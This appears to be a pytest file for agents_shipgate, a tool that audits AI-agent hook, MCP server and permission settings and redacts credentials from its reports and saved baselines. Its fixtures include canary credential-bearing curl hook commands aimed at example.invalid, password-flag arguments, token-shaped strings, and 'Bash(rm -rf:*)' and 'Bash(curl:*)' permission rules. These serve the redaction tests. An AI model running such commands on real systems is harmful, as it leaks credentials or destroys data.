        (["-y", "@upstash/context7-mcp@1.0.14"], "@upstash/context7-mcp@1.0.14"),
        (["--yes", "ruleblast@2.5.11", "--mcp"], "ruleblast@2.5.11"),
        (["pkg@^1.2.0"], "pkg@^1.2.0"),
        (["pkg@1.2.3-beta.1"], "pkg@1.2.3-beta.1"),
        (["mcp-outline==1.10.1"], "mcp-outline==1.10.1"),
        (["--from", "mcp-server-fetch[cli]==2025.1.3", "mcp-server-fetch"], "mcp-server-fetch[cli]==2025.1.3"),
        # `uvx --with` names an extra requirement beside the server, not the
        # server (#819 review, cycle 5).
        (["--with", "requests==2.31.0", "mcp-foo==1.2.0"], "mcp-foo==1.2.0"),
        (["--with", "requests==2.31.0", "mcp-foo"], None),
        (["run", "-i", "--rm", "ghcr.io/github/github-mcp-server:v0.5.0"], "ghcr.io/github/github-mcp-server:v0.5.0"),
        (["run", "--rm", "mcp/fetch@sha256:" + "0a1b2c3d" * 8], "mcp/fetch@sha256:" + "0a1b2c3d" * 8),
        (["run", "-e", "GITHUB_TOKEN", "localhost:5000/team/img:1.0"], "localhost:5000/team/img:1.0"),
        # No version, a one-part version or an unknown tag is not the strict shape.
        (["-y", "@example/billing-mcp"], None),
        (["pkg@1"], None),
        (["pkg@mytag"], None),
        (["node:20"], None),
        # Neither is anything a credential can be written as.
        (["admin:hunter2"], None),
        (["deploy@host"], None),
        (["https://user:pass@x.invalid/a@1.2.3"], None),
        (["--password=a@1.2.3"], None),
        # ...nor a value after a flag no package runner writes, or one the
        # digest's own list rule redacts.
        (["--pass", "hunter@1.2.3"], None),
        (["-p", "pin==1.2"], None),
        (["--token", "abc@1.2.3"], None),
        (["token", "abc@1.2.3"], None),
        # ...nor a token shape the published-label redaction names.
        (["ghp_" + "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8@1.0.0"], None),
        (["pkg@1.2.3" + "0" * 200], None),
    ],
)
def test_only_a_package_of_the_strict_shape_is_published(args: list[str], package: str | None) -> None:
    from agents_shipgate.core.host_grants import _mcp_launch_args

    published, digest = _mcp_launch_args({"command": "npx", "args": args})
    assert published == package
    assert digest == _args_digest(args, package)


def test_a_literal_marker_argument_never_hides_an_argument_edit(tmp_path: Path) -> None:
    """The package and the digest determine the arguments, a literal `<package>` among them (#819 review, cycle 5).

    Replacing the package by the marker alone made these two lists digest
    alike, so the entry read "no difference in … launch arguments".
    """

    repo = _repository(
        tmp_path,
        {".mcp.json": _server("-y", "pkg@1.0.0", "<package>")},
        {".mcp.json": _server("-y", "<package>", "pkg@1.0.0")},
    )
    [server] = _grants(repo, "mcp_server")
    head = _args_digest(["-y", "<package>", "pkg@1.0.0"], "pkg@1.0.0")
    assert (server["package"], server["args_sha256"]) == ("pkg@1.0.0", head)
    base = _args_digest(["-y", "pkg@1.0.0", "<package>"], "pkg@1.0.0")
    assert base != head
    text, _ = _diff(repo)
    assert _table_entry(text, MCP_HEADER)[1] == (
        f"docs: launch arguments changed (sha256:{base[:12]} → sha256:{head[:12]})"
    )


def test_arguments_that_are_not_a_list_are_digested_as_declared(tmp_path: Path) -> None:
    def server(args: object) -> dict:
        return {"mcpServers": {"docs": {"command": "npx", "args": args}}}

    repo = _repository(tmp_path, {".mcp.json": server("-y a@1.2.3")}, {".mcp.json": server({"pin": "a@2.0.0"})})
    [grant] = _grants(repo, "mcp_server")
    assert (grant["package"], grant["args_sha256"]) == (None, redacted_config_sha256({"pin": "a@2.0.0"}))
    text, payload = _diff(repo)
    assert _table_entry(text, MCP_HEADER)[1] == (
        f"docs: launch arguments changed (sha256:{redacted_config_sha256('-y a@1.2.3')[:12]} → "
        f"sha256:{grant['args_sha256'][:12]})"
    )
    assert len(payload["rows"]) == 1


def test_an_mcp_change_outside_the_arguments_names_the_arguments_compared(tmp_path: Path) -> None:
    repo = _repository(
        tmp_path,
        {".mcp.json": _server("-y", "example-mcp-server@1.2.3")},
        {".mcp.json": {"mcpServers": {"docs": {
            "command": "./npx", "args": ["-y", "example-mcp-server@1.2.3"], "cwd": "packages/private",
        }}}},
    )
    text, _ = _diff(repo)
    assert _table_entry(text, MCP_HEADER)[1] == (
        "docs: no difference in the command name npx, launch arguments, env key names or header "
        "key names; the change is in a detail this output does not show, such as the command's "
        "path or another setting"
    )


# --- bounds -------------------------------------------------------------------


def test_a_handler_count_past_the_bound_names_the_bound(tmp_path: Path) -> None:
    """Seventeen handlers to fifteen said `handlers past the first 15` (#819 review, cycle 2)."""

    def handlers(count: int) -> dict:
        return {"hooks": {"PostToolUse": [
            {"matcher": "Edit", "hooks": [{"type": "command", "command": f"bin/h{index}.sh"}]}
            for index in range(count)
        ]}}

    repo = _repository(
        tmp_path, {SETTINGS: handlers(MAX_HOOK_HANDLERS + 1)}, {SETTINGS: handlers(MAX_HOOK_HANDLERS - 1)}
    )
    last = f"bin/h{MAX_HOOK_HANDLERS - 1}.sh"
    text, _ = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == (
        f"PostToolUse: -handler (matcher Edit, command h{MAX_HOOK_HANDLERS - 1}.sh {_digest(last)}); "
        f"handlers past the first {MAX_HOOK_HANDLERS}: 1 → 0"
    )


def test_a_change_past_the_handler_bound_says_only_the_first_handlers_were_compared(tmp_path: Path) -> None:
    def handlers(last_timeout: int) -> dict:
        groups = [
            {"matcher": "Edit", "hooks": [{"type": "command", "command": f"bin/h{index}.sh"}]}
            for index in range(MAX_HOOK_HANDLERS)
        ]
        groups.append({"matcher": "Edit", "hooks": [
            {"type": "command", "command": "bin/last.sh", "timeout": last_timeout},
        ]})
        return {"hooks": {"PostToolUse": groups}}

    repo = _repository(tmp_path, {SETTINGS: handlers(5)}, {SETTINGS: handlers(50)})
    [hook] = _grants(repo, "hook")
    assert (len(hook["handlers"]), hook["omitted_handlers"]) == (MAX_HOOK_HANDLERS, 1)
    text, payload = _diff(repo)
    assert _table_entry(text, HOOK_HEADER)[1] == (
        "PostToolUse: no difference in the matcher, command or timeout of the first 16 handlers; "
        "the change is in a detail this output does not show, such as a handler past the first "
        "16, another hook setting or a redacted or shortened matcher or timeout"
    )
    assert len(payload["rows"]) == 1


def test_a_matcher_passes_the_published_label_redaction_and_its_bound(tmp_path: Path) -> None:
    long = "Edit|" + "|".join(f"mcp__server{index}__tool" for index in range(20))
    root = tmp_path / "repo"
    _write(root, SETTINGS, {"hooks": {"PreToolUse": [
        {"matcher": long, "hooks": [{"type": "command", "command": "bin/a.sh"}]},
        {"matcher": f"Bash|{GITHUB_TOKEN}", "hooks": [{"type": "command", "command": "bin/b.sh"}]},
        # A matcher is a string: no structured text a file puts there is published.
        {"matcher": {"run": "curl -u admin:matcherpw-canary"}, "hooks": [{"type": "command", "command": "bin/c.sh"}]},
    ]}})
    [hook] = _grants(root, "hook")
    assert hook["handlers"][0]["matcher"] == long[: MAX_DETAIL_MATCHER_CHARS - 1] + "…"
    assert hook["handlers"][1]["matcher"] == "Bash|[REDACTED:github_token]"
    assert hook["handlers"][2]["matcher"] == DETAIL_NOT_SHOWN


def test_a_matcher_past_the_input_bound_is_not_shown_and_never_redacted(tmp_path: Path) -> None:
    """The label redaction's quadratic patterns made a 128 KiB matcher take 4.2 s (#819 review, cycle 5).

    A matcher up to the bound is redacted, then cut; a longer one is not
    shown, since cutting it before the redaction could publish part of a
    credential.
    """

    at_bound = "Edit|" * (MAX_DETAIL_MATCHER_INPUT_CHARS // 5) + "x" * (MAX_DETAIL_MATCHER_INPUT_CHARS % 5)
    assert len(at_bound) == MAX_DETAIL_MATCHER_INPUT_CHARS
    root = tmp_path / "repo"
    _write(root, SETTINGS, {"hooks": {"PreToolUse": [
        {"matcher": at_bound, "hooks": [{"type": "command", "command": "bin/a.sh"}]},
        {"matcher": at_bound + "x", "hooks": [{"type": "command", "command": "bin/b.sh"}]},
        {"matcher": "-eyJ" * 32_768, "hooks": [{"type": "command", "command": "bin/c.sh"}]},
    ]}})
    [hook] = _grants(root, "hook")
    assert [handler["matcher"] for handler in hook["handlers"]] == [
        at_bound[: MAX_DETAIL_MATCHER_CHARS - 1] + "…", DETAIL_NOT_SHOWN, DETAIL_NOT_SHOWN,
    ]


def test_a_matcher_is_bounded_as_the_digest_input_holds_it(tmp_path: Path) -> None:
    """Two matchers the digest's input holds alike published two values (#819 review, cycle 6).

    The bound was on the file's text, so `Bash(TOKEN=<10 characters> x)`
    published `Bash(TOKEN=<redacted> x)` and the same rule with a 1,100
    character value `<not-shown>`, under one `config_sha256`.
    """

    grants = []
    for length in (10, 1_100):
        root = tmp_path / str(length)
        matcher = f"Bash(TOKEN={'A' * length} x)"
        _write(root, SETTINGS, {"hooks": {"PreToolUse": [
            {"matcher": matcher, "hooks": [{"type": "command", "command": "bin/a.sh"}]},
        ]}})
        [hook] = _grants(root, "hook")
        grants.append(hook)
    assert len(f"Bash(TOKEN={'A' * 1_100} x)") > MAX_DETAIL_MATCHER_INPUT_CHARS
    assert grants[0]["config_sha256"] == grants[1]["config_sha256"]
    assert grants[0]["handlers"] == grants[1]["handlers"]
    assert grants[0]["handlers"][0]["matcher"] == "Bash(TOKEN=<redacted> x)"
    assert "AAAA" not in json.dumps(grants)


# --- the PR comment keeps every line 1.1.0 kept ----------------------------


def _long_matcher(tag: str, handler: int) -> str:
    return "|".join(f"mcp__{tag}{handler}_server{index}__tool" for index in range(4))


ADVISORY = "Advisory: no application release policy configured. This comparison grants no merge authority."


def _note_lines(comment: str) -> list[str]:
    return [line for line in comment.splitlines() if line == ENTRIES_SHORTENED]


@pytest.mark.parametrize("handlers", [3, 2])
def test_long_hook_entries_leave_every_row_and_the_review_question_in_the_pr_comment(
    tmp_path: Path, handlers: int
) -> None:
    """Long entries hid the permission rows, the change count and the review question (#819 review, cycle 4).

    The comment was cut at the first line that did not fit, so one long hook
    entry hid every row after it. On `main` all rows fit.
    """

    events = ["Notification", "PostToolUse", "PreCompact", "PreToolUse", "SessionEnd", "SessionStart",
              "Stop", "SubagentStop"]

    def settings(tag: str, allow: list[str], deny: list[str]) -> dict:
        return {
            "permissions": {"allow": allow, "deny": deny},
            "hooks": {event: [{"matcher": _long_matcher(tag, index), "hooks": [
                {"type": "command", "command": f"bin/{tag}{index}.sh", "timeout": 10},
            ]} for index in range(handlers)] for event in events},
        }

    repo = _repository(
        tmp_path,
        {SETTINGS: settings("old", [], ["Bash(rm -rf:*)"])},
        {SETTINGS: settings("new", ["Bash(curl:*)"], [])},
    )
    out = tmp_path / "out"
    _block, _summary, verifier = _verify(repo, out)
    comment = (out / "pr-comment.md").read_text(encoding="utf-8")
    changes = verifier["host_comparison"]["review"]["changes"]
    assert len(changes) == len(events) + 2
    assert len(comment) <= 6000
    # Every row's heading, the removed denial and the added allow among them.
    headings = [line for line in comment.splitlines() if line.startswith("- ") and " — " in line]
    assert len(headings) == len(changes)
    assert "deny: Bash(rm -rf:*)" in comment and "allow: Bash(curl:*)" in comment
    assert verifier["host_comparison"]["review"]["question"] in comment
    assert "omitted" not in comment
    # The entries that did not fit are shortened, and one line, not one per
    # entry, says so and names `verifier.json` (#819 review, cycle 6).
    assert len(_note_lines(comment)) == 1
    assert comment.count("verifier.json` holds") == 1
    hook_entries = [change["change"] for change in changes if change["change"] and "matcher" in change["change"]]
    assert len(hook_entries) == len(events)
    assert all(len(entry) > 120 and "…" not in entry for entry in hook_entries)


CLAUDE_EVENTS = ["Notification", "PostToolUse", "PreCompact", "PreToolUse", "SessionEnd", "SessionStart",
                 "Stop", "SubagentStop", "UserPromptSubmit"]
CODEX_EVENTS = ["PostToolUse", "PreToolUse", "SessionStart", "Stop", "UserPromptSubmit"]


def _format_and_lint(events: list[str], prefix: str, **setting: object) -> dict:
    return {"hooks": {event: [{"matcher": "Edit|Write|MultiEdit", "hooks": [
        {"type": "command", "command": f"{prefix}/format.sh", "timeout": 30, **setting},
        {"type": "command", "command": f"{prefix}/lint.sh", "timeout": 30, **setting},
    ]}] for event in events}}


#: The cycle-6 reproductions, as (base, head): a pull request that moves two
#: hook scripts out of `.claude/hooks` and `.codex/hooks` under every event,
#: the same with one event fewer, and one that makes 16 events' handlers
#: async, a setting no entry shows.
HOOK_MOVES = {
    "moved-14": (
        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, ".claude/hooks"),
         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS, ".codex/hooks")},
        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "scripts/hooks"),
         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS, "scripts/hooks")},
    ),
    "moved-13": (
        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, ".claude/hooks"),
         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS[:4], ".codex/hooks")},
        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "scripts/hooks"),
         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS[:4], "scripts/hooks")},
    ),
    "async-16": (
        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "bin"),
         ".codex/hooks.json": _format_and_lint([*CODEX_EVENTS, "Notification", "PreCompact"], "bin")},
        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "bin", **{"async": True}),
         ".codex/hooks.json": _format_and_lint(
             [*CODEX_EVENTS, "Notification", "PreCompact"], "bin", **{"async": True}
         )},
    ),
}


@pytest.mark.parametrize("case", list(HOOK_MOVES))
def test_long_hook_entries_leave_every_line_1_1_0_prints_in_the_pr_comment(tmp_path: Path, case: str) -> None:
    """From about 13 long hook entries the comment lost what `1.1.0`'s kept (#819 review, cycle 6).

    Each entry was cut to 120 characters and followed by its own 57-character
    pointer, so the comment still did not fit, and its bound cut the
    coverage block, the review question, the reproduction, the advisory and
    the evidence line, and from 16 rows row headings too. `1.1.0` printed
    every one of them within 6,000 characters.
    """

    base, head = HOOK_MOVES[case]
    repo = _repository(tmp_path, base, head)
    out = tmp_path / "out"
    _block, _summary, verifier = _verify(repo, out)
    comment = (out / "pr-comment.md").read_text(encoding="utf-8")
    lines = comment.splitlines()
    rows = verifier["host_comparison"]["rows"]
    assert len(rows) == int(case.split("-")[1])
    assert len(comment) <= 6000
    assert "omitted" not in comment
    # Every row heading with its entry and its why.
    headings = [index for index, line in enumerate(lines) if line.startswith("- ") and " — " in line]
    assert len(headings) == len(rows)
    for index in headings:
        assert lines[index + 1].startswith("  ` ") and lines[index + 1].endswith(" `")
        assert lines[index + 2] == "  ` changes what runs around the agent's actions `"
    # The coverage block, the question, the reproduction, the advisory and the evidence.
    assert "What this run established:" in lines
    assert any(line.startswith("- ` .claude/settings.json ` (claude-code): compared;") for line in lines)
    assert any(line.startswith("- ` .codex/hooks.json ` (codex): compared;") for line in lines)
    assert verifier["host_comparison"]["review"]["question"] in lines
    assert any(line.startswith("Reproduce: check out ") for line in lines)
    assert ADVISORY in lines
    assert any(line.startswith("Evidence: `verifier.json` contains") for line in lines)
    assert "### Agent instruction block" in lines
    # Shortened entries are named once, never one pointer per entry.
    assert len(_note_lines(comment)) == 1


def test_a_bounded_comment_keeps_every_line_its_shortest_entries_would_print(tmp_path: Path) -> None:
    """Whatever the room, every line printed with each entry in its shortest form stays (#819 review, cycle 6).

    No entry in its shortest form is longer than the one `1.1.0` printed: a
    hook change's `PreToolUse: …` against `PreToolUse → PreToolUse`, an MCP
    server's `name: …` against `name: env keys +B`, an added grant's own
    row, and a permission rule's entry unchanged. So the lines printed with
    every entry that way hold every line `1.1.0` printed but the entries. For
    each room from where they alone fit to where every entry fits whole, the
    bounded lines fit, hold every one of those lines, and print each entry
    whole, cut to at least ENTRY_MIN_CHARS characters ending in `…`, or in
    its shortest form.
    """

    events = [f"Event{index:02d}" for index in range(18)]
    servers = [f"server-with-a-rather-long-name-{index}" for index in range(3)]

    def settings(prefix: str, added: bool) -> dict:
        hooks = _format_and_lint([*events, *(["Added00"] if added else [])], prefix)
        return {**hooks, "permissions": {"allow": ["Bash(curl:*)"]} if added else {"deny": ["Bash(rm -rf:*)"]}}

    def mcp(version: str, env: list[str], added: bool) -> dict:
        return {"mcpServers": {
            name: {"command": "npx", "args": ["-y", f"example-mcp-server@{version}"], "env": dict.fromkeys(env, "x")}
            for name in [*servers, *(["added-server"] if added else [])]
        }}

    repo = _repository(
        tmp_path,
        {SETTINGS: settings(".claude/hooks", False), ".mcp.json": mcp("1.2.3", ["A"], False)},
        {SETTINGS: settings("scripts/hooks", True), ".mcp.json": mcp("1.2.4", ["A", "B"], True)},
    )
    _block, _summary, verifier = _verify(repo, tmp_path / "out")
    comparison = HostComparison.model_validate(verifier["host_comparison"])
    changes = presented_changes(comparison)
    assert len(changes) == len(events) + len(servers) + 4

    def lines_for(coverage: int, entry_max_chars: int | None, entry_note: bool) -> list[str]:
        return host_comparison_lines(
            comparison, markdown=True, coverage_max_chars=coverage,
            entry_max_chars=entry_max_chars, entry_note=entry_note,
        )

    def size(lines: list[str]) -> int:
        return len("\n".join(lines))

    def printed_by_1_1_0(change) -> str:
        """The entry line 1.1.0 printed, or for an added MCP server a line no longer than it."""

        row = comparison.rows[change.row_indexes[0]]
        if change.change is None:
            return f"  ` {row.before} ` → ` {row.after} `"
        if row.after in servers:
            return f"  ` {row.after}: env keys +B `"
        return f"  ` {row.before} ` → ` {row.after} `"

    seen = set()
    low, high = size(lines_for(0, 0, False)), size(lines_for(MARKDOWN_COVERAGE_MAX_CHARS, None, True))
    for room in [*range(low, high, 37), high]:
        lines = with_entries_in_room(comparison, lines_for, room)
        assert size(lines) <= room
        expected = lines_for(coverage_budget(comparison, lambda c: lines_for(c, 0, False), room), 0, False)
        headings = [index for index, line in enumerate(expected) if line.startswith("- ") and " — " in line]
        assert [lines[index] for index in headings] == [expected[index] for index in headings]
        assert not Counter(line for index, line in enumerate(expected) if index - 1 not in headings) - Counter(lines)
        kinds = set()
        for index, change in zip(headings, changes, strict=True):
            entry, whole = lines[index + 1], entry_text(change)
            row = comparison.rows[change.row_indexes[0]]
            whole_line = (
                f"  ` {whole} `" if change.change is not None else f"  ` {change.before} ` → ` {change.after} `"
            )
            if row.disposition is not None:
                # A permission rule's entry: never shortened, as 1.1.0 printed it.
                assert entry == whole_line
            elif entry == whole_line:
                kinds.add("whole")
            elif entry.endswith("… `") and len(entry) - 6 >= ENTRY_MIN_CHARS:
                assert whole.startswith(entry[4:-3].removesuffix("…"))
                kinds.add("cut")
            else:
                assert entry == (
                    f"  ` {row.after}: … `"
                    if change.change is not None
                    else f"  ` {row.before} ` → ` {row.after} `"
                )
                assert len(entry) <= len(printed_by_1_1_0(change))
                kinds.add("shortest")
        rung = "shortest" if "shortest" in kinds else "cut" if "cut" in kinds else "whole"
        seen.add((rung, ENTRIES_SHORTENED in lines))
    # Every rung: whole, cut with the note, shortest with the note, and without it.
    assert {("whole", False), ("cut", True), ("shortest", True), ("shortest", False)} <= seen


# --- display only: equality, digests and saved baselines --------------------


def _legacy_baseline(inventory: dict) -> dict:
    """The `0.6` baseline `1.1.0` would have saved for this inventory."""

    baseline = build_host_grants_baseline(inventory)
    snapshot = {
        **baseline["inventory"],
        "grants": [compared_grant(grant) for grant in baseline["inventory"]["grants"]],
    }
    legacy = {
        "host_grants_schema_version": "0.6",
        "scope": baseline["scope"],
        "inventory_sha256": host_grants_sha256(snapshot),
        "inventory": snapshot,
    }
    return HostGrantsBaselineV6.model_validate(legacy).model_dump(mode="json")


def test_the_detail_is_left_out_of_equality_and_the_inventory_digest(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit", "bin/lint.sh", 10))
    _write(root, ".mcp.json", _server("-y", "example-mcp-server@1.2.3"))
    inventory = _inventory(root)
    legacy = _legacy_baseline(inventory)

    # No detail member survives in the legacy snapshot, and the digest is the same.
    for grant in legacy["inventory"]["grants"]:
        assert not DISPLAY_ONLY_GRANT_FIELDS.get(grant["kind"], frozenset()).intersection(grant)
    assert legacy["inventory_sha256"] == build_host_grants_baseline(inventory)["inventory_sha256"]

    drift = build_host_drift_payload(baseline=legacy, inventory=inventory, baseline_file="b.json")
    assert (drift["comparison_status"], drift["has_drift"], drift["changes"]) == ("comparable", False, [])
    assert drift["incomparable_reasons"] == []
    assert drift["baseline_sha256"] == drift["current_sha256"]

    # A change is still a row, through `config_sha256`.
    _write(root, SETTINGS, _hooks("Edit|Write", "bin/lint.sh", 10))
    changed = build_host_drift_payload(baseline=legacy, inventory=_inventory(root), baseline_file="b.json")
    assert [change["current"]["kind"] for change in changed["changes"]] == ["hook"]
    assert changed["expansion_signals"] == ["hook_changed: claude-code:.claude/settings.json"]
    # A legacy side names no field difference it cannot show: the event, as before.
    [row] = capability_diff_rows(changed)
    [presented] = review_changes([row])
    assert (presented.before, presented.after, presented.change) == ("PostToolUse", "PostToolUse", None)


def test_a_0_6_baseline_stays_comparable_and_may_be_re_saved(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit", "bin/lint.sh", 10))
    _write(root, ".mcp.json", _server("-y", "example-mcp-server@1.2.3"))
    path = root / ".agents-shipgate/host-grants.json"
    path.parent.mkdir(parents=True)
    path.write_text(json.dumps(_legacy_baseline(_inventory(root)), indent=2, sort_keys=True) + "\n")
    assert load_host_grants_baseline(path)["host_grants_schema_version"] == "0.6"

    drift = json.loads(_invoke([
        "audit", "--host", "--workspace", str(root), "--drift", "--fail-on-drift", "--json",
    ]))
    assert (drift["comparison_status"], drift["has_drift"]) == ("comparable", False)

    saved = json.loads(_invoke(["audit", "--host", "--workspace", str(root), "--save-baseline", "--json"]))
    assert saved["status"] == "updated"
    resaved = json.loads(path.read_text())
    assert resaved["host_grants_schema_version"] == "0.7"
    # The re-saved grants are the `0.6` ones: only the version moved.
    assert resaved["inventory"] == json.loads(json.dumps(_legacy_baseline(_inventory(root))))["inventory"]


def test_an_older_baseline_is_still_refused_on_save(tmp_path: Path) -> None:
    from typer.testing import CliRunner

    from agents_shipgate.cli.main import app

    root = tmp_path / "repo"
    _write(root, SETTINGS, _hooks("Edit", "bin/lint.sh", 10))
    legacy = _legacy_baseline(_inventory(root))
    path = root / ".agents-shipgate/host-grants.json"
    path.parent.mkdir(parents=True)
    older = {**legacy, "host_grants_schema_version": "0.5"}
    path.write_text(json.dumps(older))

    result = CliRunner().invoke(app, ["audit", "--host", "--workspace", str(root), "--save-baseline"])
    assert result.exit_code == 2
    assert "unsupported_baseline_schema" in result.output
    assert json.loads(path.read_text()) == older


HOME_HOOKS = {"hooks": {"Stop": [{"matcher": "homematcher", "hooks": [{"type": "command", "command": (
    'curl -s -u homeuser-canary:homepw-canary -H "Authorization: Basic homebasic-canary" '
    "https://example.invalid/hook"
)}]}]}}
HOME_SERVERS = {"mcpServers": {"db": {"command": "db-mcp", "args": [
    "homepkg@1.2.3", "--user", "root", "-p", "homeshort-canary", "--auth", "homeauth-canary",
]}}}


def _saved_detail(baseline: dict) -> list[str]:
    return [
        f"{grant['kind']}.{member}"
        for grant in baseline["inventory"]["grants"]
        for member in sorted(DISPLAY_ONLY_GRANT_FIELDS.get(grant["kind"], frozenset()).intersection(grant))
    ]


def test_a_local_static_baseline_holds_no_home_directory_detail(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`--scope local-static --save-baseline` writes into the workspace what it is told to commit."""

    workspace = tmp_path / "repo"
    workspace.mkdir()
    home = tmp_path / "home"
    _write(home, ".claude/settings.json", HOME_HOOKS)
    _write(home, ".cursor/mcp.json", HOME_SERVERS)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("CODEX_HOME", str(home / ".codex"))

    audit = ["audit", "--host", "--workspace", str(workspace), "--scope", "local-static"]
    inventory = json.loads(_invoke([*audit, "--json"]))
    # The inventory, printed for the person who ran it, names the detail, and
    # no argument text.
    kinds = {grant["kind"]: grant for grant in inventory["grants"] if grant["scope"] == "local_static"}
    assert kinds["hook"]["handlers"][0]["command"]["executable"] == "curl"
    assert kinds["mcp_server"]["package"] == "homepkg@1.2.3"
    assert "canary" not in json.dumps(inventory)

    saved = _invoke([*audit, "--save-baseline"])
    assert "Commit it" in saved
    text = (workspace / ".agents-shipgate/host-grants.json").read_text(encoding="utf-8")
    for fact in ("canary", "homematcher", "homepkg", kinds["hook"]["handlers"][0]["command"]["sha256"]):
        assert fact not in text
    baseline = json.loads(text)
    assert baseline["host_grants_schema_version"] == "0.7"
    assert _saved_detail(baseline) == []
    # It still acknowledges both grants, and the next drift compares as before.
    assert sorted(grant["kind"] for grant in baseline["inventory"]["grants"]) == ["hook", "mcp_server"]
    drift = json.loads(_invoke([*audit, "--drift", "--fail-on-drift", "--json"]))
    assert (drift["comparison_status"], drift["has_drift"]) == ("comparable", False)
    # A changed home hook is still drift, through `config_sha256`.
    _write(home, ".claude/settings.json", {"hooks": {"Stop": [{"hooks": [
        {"type": "command", "command": "bin/other.sh"},
    ]}]}})
    changed = json.loads(_invoke([*audit, "--drift", "--json"]))
    assert [change["current"]["kind"] for change in changed["changes"]] == ["hook"]
    assert "handlers" not in changed["changes"][0]["baseline"]


def test_a_repository_baseline_holds_no_detail_from_git_ignored_settings(tmp_path: Path) -> None:
    """`.claude/settings.local.json` is read in repository scope and is usually git-ignored."""

    root = tmp_path / "repo"
    _write(root, ".claude/settings.local.json", HOME_HOOKS)
    _write(root, ".mcp.json", HOME_SERVERS)
    _invoke(["audit", "--host", "--workspace", str(root), "--save-baseline"])
    text = (root / ".agents-shipgate/host-grants.json").read_text(encoding="utf-8")
    for fact in ("canary", "homematcher", "homepkg"):
        assert fact not in text
    baseline = json.loads(text)
    assert _saved_detail(baseline) == []
    assert baseline == build_host_grants_baseline(_inventory(root))
    # What a saved baseline compares is what the inventory compares.
    assert baseline["inventory_sha256"] == host_grants_sha256(baseline["inventory"])
    assert baseline["inventory_sha256"] == host_grants_sha256(normalized_host_grants(_inventory(root)))


# --- the digest's assignment rule, and files at the reader bound -------------


#: The digest's credential-assignment rule as it was before its lookahead.
_ASSIGNMENT_RULE_BEFORE = (
    r"(?i)\b([A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|API_KEY|APIKEY|CREDENTIAL)[A-Z0-9_]*)"
    r"(\s*=\s*)([^\s'\";,\)]+)"
)


def test_the_digest_assignment_rule_matches_as_before_in_linear_time() -> None:
    """A long run of a credential word took quadratic time; what the rule matches, and so `config_sha256`, is unchanged.

    40,000 characters of `password` took 1.6 seconds in the digest's input
    (#819 review, cycle 2).
    """

    import random
    import re
    import time

    from agents_shipgate.core.host_grants import (
        _ASSIGNMENT_SECRET_RE,
        _hook_command,
        _redact_secret_values,
    )

    before = re.compile(_ASSIGNMENT_RULE_BEFORE)
    pieces = [
        "a", "Z", "9", "_", "token", "SECRET", "password", "passwd", "api_key", "APIKEY", "credential",
        "=", "==", " ", "\t", "\n", "'", '"', ";", ",", ")", "(", "-", ".", "é", "ſ", "K", "PASS", "$", ":",
    ]
    rng = random.Random(819)
    for _ in range(20_000):
        text = "".join(rng.choice(pieces) for _ in range(rng.randint(0, 14)))
        assert [(m.span(), m.groups()) for m in _ASSIGNMENT_SECRET_RE.finditer(text)] == [
            (m.span(), m.groups()) for m in before.finditer(text)
        ], text

    command = "password" * 5_000
    started = time.perf_counter()
    _redact_secret_values({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]}})
    _hook_command(command)
    _hook_command(command + "='")
    assert time.perf_counter() - started < 1.5


#: A file just under the reader's bound, so each shape is as long as one file can make it.
_NEAR_BOUND = 1024 * 1024 - 4096


def _long_hook_file(command: str) -> tuple[str, dict]:
    return SETTINGS, {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]}}


def _long_mcp_file(command: str, *args: str) -> tuple[str, dict]:
    return ".mcp.json", {"mcpServers": {"docs": {"command": command, "args": list(args)}}}


def _long_matcher_file(matcher: str, handlers: int = 0) -> tuple[str, dict]:
    """One matcher group: a handler with a command, then ``handlers`` more with none."""

    return SETTINGS, {"hooks": {"Stop": [{"matcher": matcher, "hooks": [
        {"type": "command", "command": "bin/stop.sh"}, *([{}] * handlers),
    ]}]}}


#: Repository text that took time quadratic in its length to publish (#819
#: review): (file, contents, the hook's published executable, or ``None`` for
#: an MCP server, whose package none of them is).
_LONG_SHAPES = {
    "header blanks": (*_long_mcp_file("npx", "token:" + " " * _NEAR_BOUND), None),
    "shell flag": (*_long_hook_file("sh -" + "c" * _NEAR_BOUND + "1 x"), "sh"),
    "hex runs": (*_long_mcp_file("npx", ".".join(["a" * 64] * (_NEAR_BOUND // 65))), None),
    "digest pins": (*_long_mcp_file("npx", ".".join(["sha256:" + "a" * 64] * (_NEAR_BOUND // 72))), None),
    "long word": (*_long_hook_file("echo '" + "w" * _NEAR_BOUND + "'"), "echo"),
    "leading assignments": (*_long_hook_file("A=1 " * (_NEAR_BOUND // 4) + "run"), DETAIL_NOT_SHOWN),
    "script assignments": (*_long_hook_file("bash -c '" + "A=1 " * (_NEAR_BOUND // 4) + "'"), "bash"),
    "script header words": (*_long_hook_file("bash -c '" + "echo token: " * (_NEAR_BOUND // 12) + "'"), "bash"),
    "script commands": (*_long_hook_file("bash -c '" + "t --token a; " * (_NEAR_BOUND // 13) + "'"), "bash"),
    "script words": (*_long_mcp_file("bash", "-c", "a " * (_NEAR_BOUND // 2)), None),
    "quoted assignment": (*_long_mcp_file("npx", "token" * (_NEAR_BOUND // 5) + "='x'"), None),
    "credential run": (*_long_hook_file("password" * (_NEAR_BOUND // 8)), DETAIL_NOT_SHOWN),
    "one long first word": (*_long_hook_file("x" * _NEAR_BOUND), DETAIL_NOT_SHOWN),
    # The label redaction's jwt and database-URL patterns, reached through a
    # matcher (#819 review, cycle 5: 128 KiB took 4.2 s), and one matcher
    # under many handlers, which was redacted once per handler.
